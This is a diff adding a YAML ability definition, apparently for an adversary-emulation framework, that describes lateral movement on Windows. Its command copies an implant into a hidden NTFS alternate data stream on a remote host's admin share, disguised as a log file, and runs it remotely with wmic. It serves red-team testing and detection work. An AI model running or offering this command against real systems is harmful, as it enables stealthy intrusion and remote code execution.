@@ -1,0 +1,41 @@
+- repeatable: false
+  name: Lateral Movement - esentutl
+  additional_info:
+    cleanup: '[]'
+  technique_name: 'Hide Artifacts: NTFS File Attributes'
+  executors:
+  - name: psh
+    additional_info: {}
+    variations: []
+    platform: windows
+    command: 'esentutl.exe /y #{location} /d
+      \\#{remote.host.fqdn}\c$\users\public\splunk.log:#{exe_name}; invoke-command
+      #{remote.host.fqdn} -scriptblock { wmic process call create "C:\users\public\splunk.log:#{exe_name}
+      -server #{server} -group red" }'
+    code: null
+    language: null
+    payloads: []
+    timeout: 60
+    parsers: []
+    cleanup: []
+    uploads: []
+    build_target: null
+  buckets: []
+  technique_id: T1564.004
+  delete_payload: true
+  tactic: lateral-movement
+  description: Tool transfer to lateral hosts using Alternate Data Streams to hide
+    implant
+  singleton: true
+  plugin: ''
+  requirements:
+  - module: plugins.stockpile.app.requirements.not_exists
+    relationship_match:
+    - source: remote.host.fqdn
+      edge: has_agent_copy
+  - module: plugins.stockpile.app.requirements.no_backwards_movement
+    relationship_match:
+    - source: remote.host.fqdn
+  privilege: ''
+  access: {}
+  id: 22881b9d-0efa-4ef4-9704-df0f11170cc3
